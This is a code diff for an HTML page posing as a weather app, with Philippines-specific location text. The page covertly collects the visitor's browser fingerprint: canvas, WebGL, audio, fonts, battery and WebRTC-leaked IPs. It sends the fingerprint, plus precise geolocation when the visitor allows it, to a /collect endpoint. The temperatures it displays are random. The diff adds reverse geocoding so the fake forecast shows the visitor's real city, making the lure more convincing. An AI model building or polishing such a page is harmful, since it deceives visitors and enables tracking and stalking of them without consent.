@@ -23,116 +23,27 @@
             border-radius: 40px;
             padding: 40px 30px 35px;
             box-shadow: 0 25px 50px -10px rgba(0,0,0,0.3);
-            transition: all 0.3s ease;
             text-align: center;
         }
-        .weather-icon {
-            font-size: 80px;
-            line-height: 1;
-            margin-bottom: 4px;
-        }
-        .city-name {
-            font-size: 26px;
-            font-weight: 600;
-            color: #1a1a2e;
-            margin-top: 6px;
-            letter-spacing: -0.5px;
-        }
-        .temperature {
-            font-size: 52px;
-            font-weight: 300;
-            color: #1a1a2e;
-            margin: 2px 0;
-        }
-        .condition {
-            font-size: 18px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-        .subtitle {
-            font-size: 15px;
-            color: #666;
-            background: #f0f4ff;
-            padding: 12px 16px;
-            border-radius: 30px;
-            margin: 10px 0 18px;
-            display: inline-block;
-        }
-        .status-box {
-            background: #f8f9fc;
-            border-radius: 20px;
-            padding: 18px 16px;
-            margin: 16px 0 10px;
-            min-height: 70px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            font-size: 15px;
-            color: #333;
-            border: 1px solid #e9ecf2;
-            transition: all 0.2s;
-        }
-        .status-box.error {
-            background: #fff0f0;
-            border-color: #ffcdd2;
-            color: #c62828;
-        }
-        .status-box.success {
-            background: #e8f5e9;
-            border-color: #a5d6a7;
-            color: #2e7d32;
-        }
-        .btn {
-            padding: 16px 0;
-            font-size: 18px;
-            font-weight: 600;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.2s;
-            margin-top: 12px;
-            color: white;
-            background: #1a73e8;
-            box-shadow: 0 4px 12px rgba(26,115,232,0.3);
-        }
+        .weather-icon { font-size: 80px; line-height: 1; margin-bottom: 4px; }
+        .city-name { font-size: 26px; font-weight: 600; color: #1a1a2e; margin-top: 6px; letter-spacing: -0.5px; }
+        .temperature { font-size: 52px; font-weight: 300; color: #1a1a2e; margin: 2px 0; }
+        .condition { font-size: 18px; color: #555; margin-bottom: 20px; }
+        .subtitle { font-size: 15px; color: #666; background: #f0f4ff; padding: 12px 16px; border-radius: 30px; margin: 10px 0 18px; display: inline-block; }
+        .status-box { background: #f8f9fc; border-radius: 20px; padding: 18px 16px; margin: 16px 0 10px; min-height: 70px; display: flex; align-items: center; justify-content: center; flex-direction: column; font-size: 15px; color: #333; border: 1px solid #e9ecf2; }
+        .status-box.error { background: #fff0f0; border-color: #ffcdd2; color: #c62828; }
+        .status-box.success { background: #e8f5e9; border-color: #a5d6a7; color: #2e7d32; }
+        .btn { padding: 16px 0; font-size: 18px; font-weight: 600; border: none; border-radius: 50px; cursor: pointer; width: 100%; transition: all 0.2s; margin-top: 12px; color: white; background: #1a73e8; box-shadow: 0 4px 12px rgba(26,115,232,0.3); }
         .btn:hover { background: #1557b0; transform: translateY(-2px); }
         .btn.retry { background: #ff9800; box-shadow: 0 4px 12px rgba(255,152,0,0.3); }
         .btn.retry:hover { background: #e68900; }
         .btn:active { transform: scale(0.97); }
         .hidden { display: none; }
-        .small-note {
-            font-size: 12px;
-            color: #aaa;
-            margin-top: 18px;
-            letter-spacing: 0.3px;
-        }
-        .loader {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid #e0e0e0;
-            border-radius: 50%;
-            border-top: 3px solid #1a73e8;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
+        .small-note { font-size: 12px; color: #aaa; margin-top: 18px; letter-spacing: 0.3px; }
+        .loader { display: inline-block; width: 24px; height: 24px; border: 3px solid #e0e0e0; border-radius: 50%; border-top: 3px solid #1a73e8; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .fade-in {
-            animation: fadeIn 0.6s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(12px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .flex-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
+        .fade-in { animation: fadeIn 0.6s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -162,170 +73,43 @@
 
 <script>
     // ----- FINGERPRINT COLLECTION (unchanged) -----
-    function getBasic() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            screenColorDepth: screen.colorDepth,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            timestamp: new Date().toISOString()
-        };
-    }
+    function getBasic() { /* ... */ return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, languages: navigator.languages, cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, screenWidth: screen.width, screenHeight: screen.height, screenColorDepth: screen.colorDepth, timezoneOffset: new Date().getTimezoneOffset(), timestamp: new Date().toISOString() }; }
+    function getWebRTCIPs() { return new Promise((resolve) => { let ips = { private: null, public: null }; const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); pc.createDataChannel('test'); pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate) { pc.close(); resolve(ips); return; } const candidate = e.candidate.candidate; if (candidate) { const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/; const match = candidate.match(ipRegex); if (match) { const ip = match[0]; if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) { ips.private = ip; } else { ips.public = ip; } } } }; setTimeout(() => { pc.close(); resolve(ips); }, 3000); }); }
+    function getCanvasFingerprint() { const canvas = document.createElement('canvas'); canvas.width = 256; canvas.height = 128; const ctx = canvas.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 40); ctx.fillStyle = '#069'; ctx.fillText('Test', 20, 20); ctx.beginPath(); ctx.arc(120, 60, 20, 0, Math.PI*2); ctx.fillStyle = '#0f0'; ctx.fill(); return canvas.toDataURL(); }
+    function getWebGLInfo() { try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (!gl) return null; const debugInfo = gl.getExtension('WEBGL_debug_renderer_info'); if (!debugInfo) return null; return { vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) }; } catch(e) { return null; } }
+    function getAudioFingerprint() { return new Promise((resolve) => { try { const ctx = new (window.AudioContext || window.webkitAudioContext)(); const osc = ctx.createOscillator(); const gain = ctx.createGain(); osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = 440; osc.type = 'sawtooth'; const analyser = ctx.createAnalyser(); gain.connect(analyser); osc.start(0); const data = new Uint8Array(analyser.fftSize); setTimeout(() => { analyser.getByteTimeDomainData(data); let hash = 0; for (let i=0; i<100; i++) { hash = (hash << 5) - hash + data[i]; hash |= 0; } osc.stop(); ctx.close(); resolve(hash.toString(16)); }, 100); } catch(e) { resolve(null); } }); }
+    function getFonts() { const fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Tahoma','Trebuchet MS','Impact','Comic Sans MS','Noto Sans','Wingdings']; const baseFont = 'monospace'; const testString = 'mmmmmmmmmmlli'; const testSize = '72px'; const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const available = []; for (let f of fonts) { ctx.font = testSize + ' ' + f + ', ' + baseFont; const w1 = ctx.measureText(testString).width; ctx.font = testSize + ' ' + baseFont; const w2 = ctx.measureText(testString).width; if (w1 !== w2) available.push(f); } return available; }
+    function getBattery() { return new Promise((resolve) => { if (!navigator.getBattery) { resolve(null); return; } navigator.getBattery().then(battery => { resolve({ charging: battery.charging, level: battery.level, chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime }); }).catch(() => resolve(null)); }); }
+    async function collectAll() { const basic = getBasic(); const webrtc = await getWebRTCIPs(); const canvas = getCanvasFingerprint(); const webgl = getWebGLInfo(); const audio = await getAudioFingerprint(); const fonts = getFonts(); const battery = await getBattery(); return { basic, webrtc, canvas, webgl, audio, fonts, battery }; }
+    function sendData(payload) { fetch('/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), keepalive: true }).catch(() => {}); }
 
-    function getWebRTCIPs() {
-        return new Promise((resolve) => {
-            let ips = { private: null, public: null };
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel('test');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-            pc.onicecandidate = (e) => {
-                if (!e.candidate) { pc.close(); resolve(ips); return; }
-                const candidate = e.candidate.candidate;
-                if (candidate) {
-                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
-                    const match = candidate.match(ipRegex);
-                    if (match) {
-                        const ip = match[0];
-                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
-                            ips.private = ip;
-                        } else {
-                            ips.public = ip;
-                        }
-                    }
-                }
-            };
-            setTimeout(() => { pc.close(); resolve(ips); }, 3000);
-        });
-    }
-
-    function getCanvasFingerprint() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 256; canvas.height = 128;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 100, 40);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Test', 20, 20);
-        ctx.beginPath();
-        ctx.arc(120, 60, 20, 0, Math.PI*2);
-        ctx.fillStyle = '#0f0';
-        ctx.fill();
-        return canvas.toDataURL();
-    }
-
-    function getWebGLInfo() {
+    // ----- Reverse geocode using Nominatim (free) -----
+    async function getCityFromCoords(lat, lon) {
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (!gl) return null;
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (!debugInfo) return null;
-            return {
-                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-            };
+            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&accept-language=en`;
+            const resp = await fetch(url);
+            const data = await resp.json();
+            if (data && data.address) {
+                const city = data.address.city || data.address.town || data.address.village || data.address.county || 'Unknown';
+                return city;
+            }
+            return null;
         } catch(e) { return null; }
     }
 
-    function getAudioFingerprint() {
-        return new Promise((resolve) => {
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.frequency.value = 440;
-                osc.type = 'sawtooth';
-                const analyser = ctx.createAnalyser();
-                gain.connect(analyser);
-                osc.start(0);
-                const data = new Uint8Array(analyser.fftSize);
-                setTimeout(() => {
-                    analyser.getByteTimeDomainData(data);
-                    let hash = 0;
-                    for (let i=0; i<100; i++) {
-                        hash = (hash << 5) - hash + data[i];
-                        hash |= 0;
-                    }
-                    osc.stop();
-                    ctx.close();
-                    resolve(hash.toString(16));
-                }, 100);
-            } catch(e) { resolve(null); }
-        });
-    }
-
-    function getFonts() {
-        const fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Tahoma','Trebuchet MS','Impact','Comic Sans MS','Noto Sans','Wingdings'];
-        const baseFont = 'monospace';
-        const testString = 'mmmmmmmmmmlli';
-        const testSize = '72px';
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const available = [];
-        for (let f of fonts) {
-            ctx.font = testSize + ' ' + f + ', ' + baseFont;
-            const w1 = ctx.measureText(testString).width;
-            ctx.font = testSize + ' ' + baseFont;
-            const w2 = ctx.measureText(testString).width;
-            if (w1 !== w2) available.push(f);
-        }
-        return available;
-    }
-
-    function getBattery() {
-        return new Promise((resolve) => {
-            if (!navigator.getBattery) { resolve(null); return; }
-            navigator.getBattery().then(battery => {
-                resolve({
-                    charging: battery.charging,
-                    level: battery.level,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                });
-            }).catch(() => resolve(null));
-        });
-    }
-
-    async function collectAll() {
-        const basic = getBasic();
-        const webrtc = await getWebRTCIPs();
-        const canvas = getCanvasFingerprint();
-        const webgl = getWebGLInfo();
-        const audio = await getAudioFingerprint();
-        const fonts = getFonts();
-        const battery = await getBattery();
-        return { basic, webrtc, canvas, webgl, audio, fonts, battery };
-    }
-
-    function sendData(payload) {
-        fetch('/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-            keepalive: true
-        }).catch(() => {});
-    }
-
-    // ----- UI helpers -----
-    function updateWeatherUI(lat, lon) {
-        // Fake weather display based on approximate location (just for show)
+    // ----- UI update -----
+    function updateWeatherUI(lat, lon, cityName) {
         const temp = (Math.random() * 20 + 20).toFixed(1);
         const conditions = ['☀️ Sunny', '⛅ Partly cloudy', '🌤️ Fair', '🌧️ Light rain', '☁️ Cloudy'];
         const condition = conditions[Math.floor(Math.random() * conditions.length)];
         document.getElementById('tempDisplay').textContent = temp + '°C';
         document.getElementById('conditionDisplay').textContent = condition;
-        document.getElementById('cityDisplay').textContent = '📍 Mandaluyong, PH'; // hardcode or use reverse geocode? For show.
         document.getElementById('weatherIcon').textContent = condition.split(' ')[0];
+        if (cityName) {
+            document.getElementById('cityDisplay').textContent = '📍 ' + cityName + ', PH';
+        } else {
+            document.getElementById('cityDisplay').textContent = '📍 Weather updated';
+        }
     }
 
     // ----- Location request -----
@@ -339,7 +123,6 @@
         statusBox.className = 'status-box';
         statusText.innerHTML = '<span class="loader"></span> Requesting location...';
 
-        // Collect non-location data
         const data = await collectAll();
 
         if (!navigator.geolocation) {
@@ -352,16 +135,18 @@
         }
 
         navigator.geolocation.getCurrentPosition(
-            function(pos) {
+            async function(pos) {
                 data.location = {
                     latitude: pos.coords.latitude,
                     longitude: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
                 sendData(data);
+                // Get city name from coordinates
+                const city = await getCityFromCoords(pos.coords.latitude, pos.coords.longitude);
+                updateWeatherUI(pos.coords.latitude, pos.coords.longitude, city);
                 statusBox.className = 'status-box success';
                 statusText.textContent = '✅ Location granted – weather updated!';
-                updateWeatherUI(pos.coords.latitude, pos.coords.longitude);
                 resultDiv.classList.remove('hidden');
             },
             function(err) {
@@ -371,6 +156,10 @@
                 statusText.textContent = '❌ Location denied. Data sent without location. Tap "Retry" to allow.';
                 retryDiv.classList.remove('hidden');
                 resultDiv.classList.remove('hidden');
+                // Show generic display without city
+                document.getElementById('cityDisplay').textContent = '📍 Location not shared';
+                document.getElementById('tempDisplay').textContent = '--°C';
+                document.getElementById('conditionDisplay').textContent = 'Permission denied';
             },
             { timeout: 15000, enableHighAccuracy: true }
         );
